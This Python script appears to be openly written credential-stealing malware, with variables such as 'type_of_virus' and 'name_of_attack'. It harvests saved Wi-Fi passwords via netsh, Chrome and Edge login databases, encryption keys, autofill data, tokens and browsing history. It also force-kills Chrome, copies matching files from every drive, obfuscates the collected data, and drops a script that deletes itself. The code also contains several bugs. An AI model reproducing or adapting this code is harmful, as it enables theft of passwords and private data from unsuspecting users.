true_false=[]                                   
working_directory01=true_false[0]
system_info_collect=true_false[1]
chrome_data_collect=true_false[2]
chrome_data=true_false[3]
chrome_id_passsword=true_false[4]
web_data=true_false[5]
history_data_tf=true_false[6]
edge_data_tf=true_false[7]
encrypt_data_tf=true_false[8]
message_show_y_n=true_false[9]
message=true_false[10]
type_of_virus_oftf=true_false[11]
dir_search_ifnfo=true_false[12]
key=true_false[13]
name_of_attack=true_false[14]
import os
main_path=working_directory01+'\\app_data'
os.mkdir(main_path) if not os.path.exists(main_path)else None
# internet_accsess=true_false[11]
#other fuction--------------------------------------------------------------------------
def chrome_date_and_time(chrome_data):
    try:return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)
    except Exception as e:print(f"Error in chrome_date_and_time: {e}");return None
def encoding_check(path_to_open:str,format_to_open:str='r',json_file=False):
    '''so this code check every encoding tecnice to open file and don't let raise error
    path_to_open:   this argument ask which path to open sting obj
    format to open: this argument ask in which mode to open suppor string obj
                    'r' , ' r+'   
    json_file:      the file we opening is json or not it's check that bool value
    *** this code can't be use for writing in file ***        '''
    encoding_types = ["UTF-8","UTF-16","UTF-32","ASCII","ANSI","ISO-8859-1","Windows-1252","Unicode"]
    for i in encoding_types:
        try: 
            with open(path_to_open,format_to_open,encoding=i) as file:
                if format_to_open in ('r','r+'):
                    if json_file:file1=json.load(file)
                    else:file1=file.read()
                    return file1
        except UnicodeDecodeError: continue
        except Exception:continue
        except FileNotFoundError:pass
    return None
def check_internet_connection():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    try:sock.connect(("www.google.com", 80));return True
    except socket.error:return False
    finally:sock.close()
#import----------------------------------------------------------------------->
import socket
from datetime import timedelta,datetime
import time
import subprocess
import random
while True:
    if check_internet_connection():break
    else:time.sleep(5);print('waiting for internet')
try:import pip
except ImportError:
    try:import ensurepip;ensurepip.bootstrap()
    except ImportError: pass
try:import os
except ImportError as e:subprocess.call(['pip3','install','os']) 
try:import platform
except ImportError as e:subprocess.call(['pip3','install','platform']) 
try:import socket
except ImportError as e:subprocess.call(['pip3','install','socket'])
try:import json
except ImportError as e:subprocess.call(['pip3','install','json'])
try:import sqlite3
except ImportError as e:subprocess.call(['pip3','install','sqlite3'])
try:import shutil
except ImportError as e:subprocess.call(['pip3','install','shutil'])
try:from termcolor import colored
except Exception as e:subprocess.call(['pip3','install','termcolor'])
from datetime import timezone, datetime,timedelta
#main_function------------------------------------------------------------------------------#
def system_info(path_to_save:str,encodig_list):
    try:
        info=[platform.system(),platform.architecture(),platform.machine(),platform.node(),platform.platform(aliased=True),platform.processor(),platform.python_branch(),platform.python_version(),platform.python_revision(),platform.win32_ver()]
        info.append(host1:=socket.gethostname())
        try:ip_address=socket.gethostbyname(host1)
        except socket.gaierror:ip_address=None
        if bool(ip_address):
            try:interface=socket.gethostbyname(ip_address)
            except socket.gaierror:interface=None
        info.append(ip_address)
        info.append(interface)
        for i in encodig_list:
            try:data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode(i).split('\n');break
            except Exception:continue
        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
        password11=[]
        for i in profiles:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
            try:password11.append(results)
            except IndexError:password11.append('_______')
        info.append(profiles)
        info.append(password11)
        with open(path_to_save,'w+',encoding='UTF-8') as d:
            d.write(str(info))
        return True
    except Exception:
        return False
def chrome_data_basic(path_to_save:str):
    '''chrrome_data_basic colloect basic data of chrome and the save it to 
    the path given in argument ---->  path to save
    this is what all this code do call one more fuction encoding_check
    
    return True if everything okay and False if nothing oki'''
    try:
        data1=[]
        def gender(ppa):
            if ppa==1:return 'male'
            elif ppa==2:return 'female'
            else:return 'other'
        def accsept_lang(ppa_jas):
            try:return ppa_jas['intl']['accept_languages']
            except Exception: return 'nothing error in fating error-404'
        local_state_path=os.environ["USERPROFILE"]+'\\AppData\\Local\\Google\\Chrome\\User Data\\Local State'
        if os.path.exists(local_state_path):
            if bool(local_state_jason:=encoding_check(local_state_path,'r',True)):
                data1.append(local_state_jason["os_crypt"]["encrypted_key"])
                data1.append(profile_list:=local_state_jason['profile']['profiles_order'])
                for i in profile_list:
                    data2=[
                        str(local_state_jason['profile']['info_cache'][i]['gaia_given_name']),
                        str(local_state_jason['profile']['info_cache'][i]['gaia_id']),
                        str(local_state_jason['profile']['info_cache'][i]['gaia_name']),
                        str(local_state_jason['profile']['info_cache'][i]['hosted_domain']),
                        str(local_state_jason['profile']['info_cache'][i]['last_downloaded_gaia_picture_url_with_size']),
                        str(local_state_jason['profile']['info_cache'][i]['managed_user_id']),
                        str(local_state_jason['profile']['info_cache'][i]['name']),
                        str(local_state_jason['profile']['info_cache'][i]['user_name'])
                        ]
                    preferanse_path=os.environ["USERPROFILE"]+'\\AppData\\Local\\Google\\Chrome\\User Data\\'+i+'\\Preferences'
                    if os.path.exists(preferanse_path):
                        ppa_jason=encoding_check(preferanse_path,'r',True)
                        if bool(ppa_jason):
                            data3=[
                                str(ppa_jason.get('sync', {}).get('birthday', None)),
                                str(ppa_jason.get('sync', {}).get('cache_guid', None)),
                                str(ppa_jason.get('sync', {}).get('demographics', {}).get('birth_year', None)),
                                gender(ppa_jason.get('sync', {}).get('demographics', {}).get('gender', None)),
                                accsept_lang(ppa_jason),
                                str(ppa_jason.get('intl', {}).get('selected_languages', None)),
                                str(ppa_jason.get('google', {}).get('services', {}).get('last_gaia_id', None)),
                                str(ppa_jason.get('google', {}).get('services', {}).get('signin', {}).get('REFRESH_TOKEN_RECEIVED', {}).get('time', None)),
                                str(ppa_jason.get('google', {}).get('services', {}).get('signin', {}).get('REFRESH_TOKEN_RECEIVED', {}).get('value', None))
                                ]


                        else:data3=['there is some error while conecting to path']
                    else:data3=['error 404 preferance path not found']
                    data2.append(data3)
                    data1.append(data2.copy())
                with open(path_to_save,'w+',encoding='utf8') as si1:
                    si1.write(str(data1))
                return True
            else:return False
        else:return False
    except Exception:
        return False
def chrome_id_password_c(path_to_save:str):
    data1=[];data2=[]
    try:
        profile_path=os.environ["USERPROFILE"]+'\\AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data'
        if os.path.exists(profile_path):
            collecting_data=sqlite3.connect(profile_path)
            extracted_data=collecting_data.cursor()
            try:query=extracted_data.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_last_used")
            except sqlite3.OperationalError:os.system("taskkill /im chrome.exe /f");query=extracted_data.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_last_used")
            except Exception as e:query=None
            if bool(query):
                data1.append('default01')
                for row in query.fetchall():
                    data3=[row[0],row[1],row[2],row[3],row[4],row[5]]
                    data2.append(data3)
            else:
                data1.append('error202:)')
                data2.appned([f'there is nothing error:) {e}'])
        else:
            data1.append('error404:)')
            data2.append(['there is nothing error404 :)'])
        data1.append(data2.copy())
        data1.append('data_profile')
        data2.clear()
        response=encoding_check(os.environ["USERPROFILE"]+'\\AppData\\Local\\Google\\Chrome\\User Data\\Local State','r',True)if os.path.exists(os.environ["USERPROFILE"]+'\\AppData\\Local\\Google\\Chrome\\User Data\\Local State') else None
        if bool(response):
            profile_list=response['profile']['profiles_order'];encryption_key=response["os_crypt"]["encrypted_key"]
            data2.append(profile_list)
            data2.append(encryption_key)
            for i in profile_list:
                login_data=os.environ["USERPROFILE"]+'\\AppData\\Local\\Google\\Chrome\\User Data\\'+i+'\\Login Data'
                if os.path.exists(login_data):
                    collecting_data=sqlite3.connect(login_data)
                    extracted_data=collecting_data.cursor()
                    try:query=extracted_data.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_last_used")
                    except sqlite3.OperationalError:os.system("taskkill /im chrome.exe /f");query=extracted_data.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_last_used")
                    except Exception as e:query=None
                    if bool(query):
                        data3=[True]
                        for row in query.fetchall():
                            data4=[row[0],row[1],row[2],[row[3],row[4],row[5]]]
                            data3.append(data4.copy())
                    else:data3=[False,[f'error while conecting Error202 {e}']]
                else:data3=[False,['path does not exist Error404']]
                data2.append(data3.copy())
                data3.clear()
        else:data3=[False,['path does not exist Error404']]
        data1.append(data2.copy());data2.clear()
        with open(path_to_save,'w+',encoding='utf8') as sid1:
            sid1.write(str(data1))
        return True
    except Exception:
        return False
def chrome_web_data(path_to_save:str):
    try:
        root1=[]
        web_data_default=os.environ["USERPROFILE"]+'\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data'
        if os.path.exists(web_data_default):
            collecting_info=sqlite3.connect(web_data_default)
            collecting_info=collecting_info.cursor()
            try:query=collecting_info.execute('select name,value,date_created,date_last_used from autofill')
            except sqlite3.OperationalError:os.system("taskkill /im chrome.exe /f");query=collecting_info.execute('select name,value,date_created,date_last_used from autofill')
            except Exception as e:query=None
            if bool(query):
                child_root1=[True]
                for row in query.fetchall():child_root1.append([row[0],row[1],row[2],row[3]])
            else:
                child_root1=[False]
                child_root1.append([f'error while conecting error202 {e}'])
            try:query=collecting_info.execute('select service,encrypted_token from token_service')
            except sqlite3.OperationalError:os.system("taskkill /im chrome.exe /f");query=collecting_info.execute('select service,encrypted_token from token_service')
            except Exception as e:query=None
            if bool(query):
                child_root1=[True]
                for i in query.fetchall():child_root2.append([row[0],row[1]])
            else:
                child_root2=[False]
                child_root2.append([f'error while conecting error 202{e}'])
        else:
            child_root1=[False,['error while finding error 404']]
            child_root2=[False,['error while finding error 404']]
        root1.append(child_root1.copy())
        root1.append(child_root2.copy())
        response=encoding_check(os.environ["USERPROFILE"]+'\\AppData\\Local\\Google\\Chrome\\User Data\\Local State','r',True)if os.path.exists(os.environ["USERPROFILE"]+'\\AppData\\Local\\Google\\Chrome\\User Data\\Local State') else None
        child_container=[];child_container1=[]
        if bool(response):
            child_container.append(profile_list:=response['profile']['profiles_order']);#encryption_key=response["os_crypt"]["encrypted_key"]
            for i in profile_list:
                path=os.environ["USERPROFILE"]+'\\AppData\\Local\\Google\\Chrome\\User Data\\'+i+'\\Web Data'
                if os.path.exists(path):
                    collecting_info=sqlite3.connect(path)
                    collecting_info=collecting_info.cursor()
                    try:query=collecting_info.execute('select name,value,date_created,date_last_used from autofill')
                    except sqlite3.OperationalError:os.system("taskkill /im chrome.exe /f");query=collecting_info.execute('select name,value,date_created,date_last_used from autofill')
                    except Exception as e: query=None
                    if bool(query):
                        child_root=[True]
                        for row in query.fetchall():child_root.append([row[0],row[1],row[2],row[3]])
                    else:child_root=[False,[f'there is some error while conecting to the data{e}']]
                    try:query1=collecting_info.execute('select service,encrypted_token from token_service')
                    except sqlite3.OperationalError:os.system("taskkill /im chrome.exe /f");query1=collecting_info.execute('select service,encrypted_token from token_service')
                    except Exception as e: query1=None
                    if bool(query1):
                        child_root1=[True]
                        for row in query.fetchall():child_root1.append([row[0],row[1]])
                    else:child_root1=[False,[f'there is some error while conecting to the data{e}']]
                else:
                    child_root=[False,['path does not exists errror 404']]
                    child_root1=[False,['path does not exists errror 404']]
                child_container.append(child_root.copy());child_root.clear()
                child_container1.append(child_root1.copy());child_root1.clear()
            root1.append(child_container.copy());child_container.clear()
            root1.append(child_container1.copy());child_container1.clear()
        else:
            root1.append([[False,['path does not exists errror 404']]])
            root1.append([[False,['path does not exists errror 404']]])
        with open(path_to_save,'w+',encoding='utf8') as sid1:
            sid1.write(str(root1))
        return True
    except Exception as e:
        print(e)
        return False
def history_data(path_to_save):
    try:
        root1=[]
        history_default_path=os.environ["USERPROFILE"]+'\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History'
        if os.path.exists(history_default_path):
            root1.append(True)
            collecting_data=sqlite3.connect(history_default_path)
            collecting_data=collecting_data.cursor()
            try:query=collecting_data.execute('select term from keyword_search_terms')
            except sqlite3.OperationalError:os.system('taskkill /im chrome.exe /f');query=collecting_data.execute('select term from keyword_search_terms')
            except Exception as e:query=None
            if bool(query):
                keywords=[True,[]]
                for row in query.fetchall():
                    keywords[1].append(row[0])
            else:keywords=[False,[f'there is some errro while conecting{e}']]
            try:query=history_data.execute('select url,title,visit_count from urls')
            except sqlite3.OperationalError:os.system('taskkill /im chrome.exe /f');query=history_data.execute('select url,title,visit_count from urls')
            except Exception as e:query=None
            if bool(query):
                visisted_site=[True,[]]
                for row in query.fetchall():
                    visisted_site[1].append([row[0],row[1],row[2]])
            else:visisted_site=[False,[f'there is some errro while conecting{e}']]
        else:
            root1.append(False);keywords="keyword---error 404";visisted_site="visted_site---error 404"
        root1.append(keywords);root1.append(visisted_site)
        response=encoding_check(os.environ["USERPROFILE"]+'\\AppData\\Local\\Google\\Chrome\\User Data\\Local State','r',True)if os.path.exists(os.environ["USERPROFILE"]+'\\AppData\\Local\\Google\\Chrome\\User Data\\Local State') else None
        if bool(response):
            child_root=[]
            root1.append(profile_list:=response['profile']['profiles_order'])
            for i in profile_list:
                historypath=os.environ["USERPROFILE"]+str('\\AppData\\Local\\Google\\Chrome\\User Data\\')+str(i)+str('\\History')
                child_01=[]
                if os.path.exists(historypath):
                    child_01.append(True)
                    collecting_data=sqlite3.connect(historypath)
                    collecting_data=collecting_data.cursor()
                    try:query=collecting_data.execute('select term from keyword_search_terms')
                    except sqlite3.OperationalError:os.system('taskkill /im chrome.exe /f');query=collecting_data.execute('select term from keyword_search_terms')
                    except Exception as e:query=None
                    if bool(query):
                        keyword=[True,[]]
                        for row in query:
                            keyword[1].append(row[0])
                    else:keyword=[False,[f'there where some error while conecting{e}']]
                    try:query=collecting_data.execute('select url,title,visit_count from urls')
                    except sqlite3.OperationalError:os.system('taskkill /im chrome.exe /f');query=collecting_data.execute('select url,title,visit_count from urls')
                    except Exception as e:query=None
                    if bool(query):
                        visted_sites=[True,[]]
                        for row in query:
                            visted_sites[1].append([row[0],row[1],row[2]])
                    else:visted_sites=[False,[f'there where some error while conecting{e}']]
                else:
                    child_01.append(False)
                    keyword='keyword---error 404';visted_sites='visted_site---error 404'
                child_01.append(keyword);child_01.append(visted_sites)
                child_root.append(child_01.copy())
            root1.append([child_root])
        else:root1.append(None);root1.append(None)
        with open(path_to_save,'w+',encoding='utf-8') as sih:
            sih.write(str(root1))
            sih.close()
        return True
    except Exception as e: print(e);return False
def edge_data(path_to_save):
    try:
        root1=[]
        data=encoding_check(os.environ["USERPROFILE"]+'\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State','r',json_file=True)
        encryption_key=data['os_crypt']['encrypted_key']
        child_root1=[
            str(data['profile']['info_cache']['Default'].get('edge_account_cid', None)),
            str(data['profile']['info_cache']['Default'].get('edge_account_first_name', None)),
            str(data['profile']['info_cache']['Default'].get('edge_account_last_name', None)),
            str(data['profile']['info_cache']['Default'].get('gaia_id', None)),
            str(data['profile']['info_cache']['Default'].get('gaia_name', None)),
            str(data['profile']['info_cache']['Default'].get('user_name', None)),encryption_key]
        root1.append(child_root1.copy())
        login_data_path=os.environ["USERPROFILE"]+'\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data'
        collecting_data=sqlite3.connect(login_data_path)
        collecting_data=collecting_data.cursor()
        try:query=collecting_data.execute("select origin_url, username_value, password_value, date_created, date_last_used from logins order by date_last_used") 
        except sqlite3.OperationalError:os.system("taskkill /im chrome.exe /f");query=collecting_data.execute("select origin_url, username_value, password_value, date_created, date_last_used from logins order by date_last_used") 
        except Exception as e:query=None
        child_root2=[]
        if bool(query):
            child_root2.append(True)
            for row in query.fetchall():
                child_root2.append([row[0],row[1],row[2],row[3],row[4]])
        else:child_root2.append(False);child_root2.append(f'there is some error while conecting{e}')
        root1.append(child_root2.copy())
        with open(path_to_save,'w+',encoding='utf-8')as sie:
            sie.write(str(root1))
        return True
    except Exception:return False
def dir_search(saving_path: str, specific_path_tf: bool = True, specific_path: str = "C:\\Users", search_name: bool = True, search_extension: bool = False, list_of_search: list = [], list_of_extension_search: list = []):
    try:
        found = found1 = 0
        if not os.path.exists(saving_path):
            os.mkdir(saving_path)
        path_list = ['%s:\\' % chr(i) for i in range(ord('A'), ord('Z')+1)]
        paths = [p for p in path_list if os.path.exists(p)] if not specific_path_tf else [specific_path]
        for path in paths:
            for dirpath, dirnames, filenames in os.walk(path):
                for filename in filenames:
                    file_name, file_extension = os.path.splitext(filename)
                    print(file_name+file_extension)
                    if search_name and file_name.strip() in list_of_search:
                        found += 1
                        source_path = os.path.join(dirpath.strip(), filename.strip())
                        try:shutil.copy(source_path, saving_path)
                        except Exception:found-=1
                    elif search_extension and file_extension.strip() in list_of_extension_search:
                        found1 += 1
                        source_path = os.path.join(dirpath.strip(), filename.strip())
                        try:shutil.copy(source_path, saving_path)
                        except Exception:found1-=1
        return True, found, found1
    except Exception:
        return False
def encrypt_data(main_path,key):
    try:
        def number_coding(string:str, key:str):
            k=key.split('0');k.pop(k.index(''))
            w = 'abcdefghijklmnopqrstuvwxyz!@#$%^&*()_-+={}[]|\\:;\"\'<,>.?/~` 1234567890'
            c = {w[i]: k[i] for i in range(69)}
            c2 = k[69:81]
            encoded_str = ''.join(c[i]+'0' if i in c else i+'0' for i in string)
            str1 = ''.join(random.choice(c2)+'0' if i == '53' else i+'0' for i in encoded_str.split('0'))
            return str1
        file_list=['system_info','chrome_data','chrome_id_pass','chrome_web_data','chr_history_data','system_edge']
        path=main_path+'\\dir_search'
        for i in file_list:
            try:
                with open(main_path+'\\'+i+'new','w+',encoding='Utf-8')as writing:
                    with open(main_path+'\\'+i,'r',encoding='Utf-8') as reading:
                        lol=number_coding(reading.read(),key=key)
                        reading.close()
                        try:os.remove(main_path+'\\'+i)
                        except Exception:pass
                    writing.write(str(lol))
            except Exception as e:pass
        if os.path.exists(path):
            path_new=main_path+'\\dir_search_new'
            os.mkdir(path_new) if not os.path.exists(path_new) else None
            for i in os.listdir(path):
                try:
                    with open(path_new+'\\'+i.replace(".", "-")+'.txt','w+',encoding='Utf-8')as writing:
                        try:
                            with open(path+'\\'+i,'rb') as reading:
                                lol=str(number_coding(str(reading.read()),key))
                                reading.close()
                        except Exception as e:pass
                        try:os.remove(path+'\\'+i)
                        except Exception as e:pass
                        writing.write(lol)
                except Exception as e:pass
                print()
            try:shutil.rmtree(path)
            except Exception:pass
        else:pass
        return True ,path_new
    except Exception as e :return False,None
def file_transefer(type_of_virus:bool,data:list,data_coolect:list,status,path):
    info={
        'name_of_attack':data[1],
        'encryption_key':data[0],
        'data_able_to_collect':{
            'system_info':data_coolect[0],
            'chrome_basic_data':data_coolect[1],
            'chrome_id-pass':data_coolect[2],
            'chrome_web_data':data_coolect[3],
            'chrome_history_data':data_coolect[4],
            'edge_data':data_coolect[5],
            'dir_search':data_coolect[6],
            'encryption_data':data_coolect[7]
        },
        'status':status
    }
    with open(path+'\\info.json','w+',encoding='Utf-8')as saving:
        json.dump(info,saving)
    if type_of_virus:
        timmer=120
        while True:
            print('all fille extracted to and saved to\n',path,'\ncopy the whole foleder( app_data ) in your devies under 2min after that it will delete everything:)','\ntime remain  ',timmer,colored('/!\\ we are sorry there is no online way to send data yet'))
            time.sleep(1)
            timmer-=1
            os.system('cls')
            if timmer==0:break
            else:pass
        pass
    else:
        timmer=120
        while True:
            print('all fille extracted to and saved to\n',path,'\ncopy the whole foleder( app_data ) in your devies under 2min after that it will delete everything:)','\ntime remain  ',timmer,)
            time.sleep(1)
            timmer-=1
            os.system('cls')
            if timmer==0:break
            else:pass
def encrypt_the_system():
    print('that is so dangerus prefer not to use so \nstill i am gonna give update later')
    return True
def message_and_deletaion(working_directory01,message_show_y_n,message):
    write12='''
    python_virus=list1[0]
    working_directory=list1[1]
    message_show_yn=list1[2]
    messsage=list1[3]
    import os
    import time
    import shutil
    import subprocess
    time.sleep(5)
    while os.path.exists(python_virus):
        try:os.remove(python_virus)
        except PermissionError:subprocess.run(['Cmd','del',python_virus])
        except FileNotFoundError or FileExistsError:break
    while os.path.exists(working_directory+'\\app_data'):
        try:shutil.rmtree(working_directory+'\\app_data')
        except PermissionError:
            for dirpath, dirnames, filenames in os.walk(working_directory+'\\app_data'):
                for filename in filenames:
                    try:os.remove(dirpath+'\\'+filename)
                    except PermissionError:subprocess.run(['Cmd','del',dirpath+'\\'+filename])
                    except FileNotFoundError or FileExistsError:pass
            break
        except FileNotFoundError or FileExistsError:break
    if message_show_yn:
        str0=messsage
        import time
        import os 
        charector='abcdefghijklmnopqrstuvwxyz1234567890. ABCDEFGHIJKLMNOPQRSTUVWXYZ[]:;"/\'\\<>,?-_+=&@!#$^*(){\}'
        str1=['A' for _ in str0]
        for char in charector:
            for i in range(len(str0)):
                for num,alp in enumerate(str0):
                    if not str1[num]==alp:
                        str1[num]=char
            os.system('cls')
            print(hi:=''.join(a for a in str1))
            if str0==hi:break
            time.sleep(0.20)
        nothing=input()
    '''
    list1=[__file__,working_directory01,message_show_y_n,message]
    with open('C:\\Users\\Public\\Public Downloads\\delete.py','w')as pywrite:
        pywrite.write(write12)
    os.system(f'cmd /k python C:\\Users\\Public\\Public Downloads\\delete.py')
encoding_types = ["UTF-8","UTF-16","UTF-32","ASCII","ANSI","ISO-8859-1","Windows-1252","Unicode"]
if system_info_collect:
        system_info_response=system_info(main_path+'\\system_info',encoding_types)
else:system_info_response=False
if chrome_data_collect:
    if chrome_data:chrome_data_basic_response=chrome_data_basic(main_path+'\\chrome_data')
    else:chrome_data_basic_response=False
    if chrome_id_passsword:chrome_id_password_c_response=chrome_id_password_c(main_path+'\\chrome_id_pass')
    else:chrome_id_passsword=False
    if web_data:chrome_web_data_response=chrome_web_data(main_path+'\\chrome_web_data')
    else:chrome_web_data_response=False
    if history_data_tf:history_data_response=history_data(main_path+'\\chr_history_data')
    else:history_data_response=False
else:chrome_data_basic_response=False;chrome_id_password_c_response=False;chrome_web_data_response=False;history_data_response=False
if edge_data_tf:edge_data_response=edge_data(main_path+'\\system_edge')
else:edge_data_response=False
if dir_search_ifnfo[0]:
    main_dir=main_path+'\\dir_search'
    os.mkdir(main_dir)if not os.path.exists(main_path+'\\dir_search') else None
    dir_search_ifnfo_response=dir_search(saving_path=main_dir,specific_path_tf=dir_search_ifnfo[1],specific_path=dir_search_ifnfo[2],search_name=dir_search_ifnfo[3],search_extension=dir_search_ifnfo[5],list_of_search=dir_search_ifnfo[4],list_of_extension_search=dir_search_ifnfo[6])
else:dir_search_ifnfo_response=False
if encrypt_data_tf:encrypt_data_response=encrypt_data(main_path,true_false[13])
else:encrypt_data_response=False
info=[system_info_response if system_info_collect else None,chrome_data_basic_response if chrome_data else None,chrome_id_password_c_response if chrome_id_passsword else None,chrome_web_data_response if web_data else None,history_data_response if history_data_tf else None,edge_data_response if edge_data_tf else None,dir_search_ifnfo_response if dir_search_ifnfo else None,encrypt_data_response if encrypt_data_tf else None]
file_transefer(type_of_virus=type_of_virus_oftf,data=[key,name_of_attack],data_coolect=info,status=str(datetime.now()),path=main_path)
message_and_deletaion(working_directory01,message_show_y_n,message)
quit()